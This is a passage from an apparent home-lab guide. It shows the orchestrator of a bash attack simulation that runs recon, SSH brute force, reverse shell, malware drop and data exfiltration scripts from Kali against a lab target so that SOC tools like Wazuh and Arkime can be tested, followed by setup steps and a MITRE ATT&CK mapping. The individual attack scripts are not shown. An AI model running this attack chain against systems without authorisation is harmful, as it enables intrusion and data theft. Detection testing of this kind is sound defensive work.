        log_master "RUN" "Executing: $interpreter $SCRIPTS_DIR/$script"

        # Run the script and capture output
        "$interpreter" "$SCRIPTS_DIR/$script" 2>&1 | tee -a "$MASTER_LOG"
        EXIT_CODE=${PIPESTATUS[0]}

        if [[ $EXIT_CODE -eq 0 ]]; then
            log_master "SUCCESS" "Phase $phase_num completed successfully"
            echo -e "${GREEN}  ✅ Phase $phase_num — $phase_name: COMPLETE${NC}"
        else
            log_master "WARN" "Phase $phase_num exited with code $EXIT_CODE"
            echo -e "${YELLOW}  ⚠️  Phase $phase_num completed with warnings (exit $EXIT_CODE)${NC}"
        fi
    else
        log_master "ERROR" "Script not found: $SCRIPTS_DIR/$script"
        echo -e "${RED}  ❌ Script not found: $script — Skipping...${NC}"
    fi
}

# ─── PRE-FLIGHT CHECKS ───────────────────────────────────────
phase_banner "PRE-FLIGHT CHECKS"

log_master "INIT" "Master attack simulation starting"
log_master "INIT" "Target: $TARGET_IP | Kali: $KALI_IP"
log_master "INIT" "Master log: $MASTER_LOG"

echo -e "${BLUE}[*] Checking requirements...${NC}"

# Check tools
for tool in nmap nc python3 curl ping; do
    if command -v "$tool" &>/dev/null; then
        echo -e "  ${GREEN}✅ $tool found${NC}"
    else
        echo -e "  ${RED}❌ $tool not found — some modules may fail${NC}"
    fi
done

# Check target reachability
echo -e "\n${BLUE}[*] Checking target reachability...${NC}"
if ping -c 2 -W 2 "$TARGET_IP" &>/dev/null; then
    echo -e "  ${GREEN}✅ Target $TARGET_IP is reachable${NC}"
    log_master "INFO" "Target reachability: UP"
else
    echo -e "  ${YELLOW}⚠️  Target $TARGET_IP not responding to ping — continuing anyway${NC}"
    log_master "WARN" "Target not responding to ping"
fi

echo -e "\n${YELLOW}[!] Starting full attack chain in 10 seconds...${NC}"
echo -e "${YELLOW}[!] Press Ctrl+C to abort${NC}\n"
countdown 10 "Attack chain starts in"

# ─── ATTACK CHAIN ────────────────────────────────────────────

# PHASE 1: Reconnaissance
run_phase 1 "Reconnaissance & Port Scanning" "01_recon_scan.sh" "bash"
log_master "DELAY" "Waiting $DELAY_LONG seconds before next phase (realistic pacing)..."
countdown $DELAY_LONG "Brute force phase"

# PHASE 2: Brute Force
run_phase 2 "SSH Brute Force" "02_ssh_bruteforce.py" "python3"
log_master "DELAY" "Waiting $DELAY_LONG seconds..."
countdown $DELAY_LONG "Reverse shell phase"

# PHASE 3: Reverse Shell
run_phase 3 "Reverse Shell Establishment" "03_reverse_shell.sh" "bash"
log_master "DELAY" "Waiting $DELAY_SHORT seconds..."
countdown $DELAY_SHORT "Malware simulation phase"

# PHASE 4: Malware Simulation
run_phase 4 "Malware Drop & Execution" "04_malware_simulation.sh" "bash"
log_master "DELAY" "Waiting $DELAY_SHORT seconds..."
countdown $DELAY_SHORT "Exfiltration phase"

# PHASE 5: Data Exfiltration
run_phase 5 "Data Exfiltration" "05_data_exfiltration.py" "python3"

# ─── FINAL SUMMARY ───────────────────────────────────────────
phase_banner "ATTACK CHAIN COMPLETE — SUMMARY"

echo -e "${BOLD}Attack Simulation Summary${NC}"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
printf "  %-4s %-35s %s\n" "No." "Phase" "Status"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
printf "  ${GREEN}%-4s %-35s ✅${NC}\n" "1." "Reconnaissance (Nmap)"
printf "  ${GREEN}%-4s %-35s ✅${NC}\n" "2." "SSH Brute Force (Hydra/Paramiko)"
printf "  ${GREEN}%-4s %-35s ✅${NC}\n" "3." "Reverse Shell (Netcat)"
printf "  ${GREEN}%-4s %-35s ✅${NC}\n" "4." "Malware Simulation (Persistence/C2)"
printf "  ${GREEN}%-4s %-35s ✅${NC}\n" "5." "Data Exfiltration (HTTP/DNS/ICMP)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "\n  ${BOLD}Master Log:${NC} $MASTER_LOG"
echo -e "  ${BOLD}Duration:${NC}   ~$((DELAY_SHORT*2 + DELAY_LONG*2 + 120)) seconds\n"

log_master "DONE" "Full attack chain simulation complete"
log_master "DONE" "Check: Wazuh → TheHive | Arkime | EveBox | Velociraptor"

echo -e "${GREEN}${BOLD}Now check your SOC tools for detections! 🛡️${NC}\n"
echo -e "  📊 Wazuh Alerts   → https://192.168.1.14:7001"
echo -e "  🐟 Arkime PCAP    → http://192.168.1.14:7008"
echo -e "  📦 EveBox IDS     → https://192.168.1.14:7015"
echo -e "  🦅 Velociraptor   → https://192.168.1.14:7000"
echo -e "  🐝 TheHive Cases  → http://192.168.1.14:7005\n"
```

---

## 📁 Setup — How to Use

```bash
# 1. On Kali — create scripts directory
mkdir -p ~/cyberblue-attacks
cd ~/cyberblue-attacks

# 2. Save each script with its filename (01_recon_scan.sh etc.)
# 3. Make all scripts executable
chmod +x *.sh *.py

# 4. Install Python dependency
pip3 install paramiko

# 5. Edit parameters at the top of each script:
#    TARGET_IP, KALI_IP — your actual lab IPs

# 6. Run individual scripts or the full chain:
sudo bash 01_recon_scan.sh
python3 02_ssh_bruteforce.py
sudo bash 00_master_attack_sim.sh  # Full chain
```

---

## 🗺️ MITRE ATT&CK Summary

| Script | Techniques |
|--------|-----------|
| `01_recon_scan.sh` | T1046, T1595.001, T1595.002 |
| `02_ssh_bruteforce.py` | T1110.001 |
| `03_reverse_shell.sh` | T1059.004, T1071.001, T1105 |
| `04_malware_simulation.sh` | T1105, T1036.005, T1053.003, T1082, T1083, T1070 |
| `05_data_exfiltration.py` | T1041, T1048.003, T1560.001 |
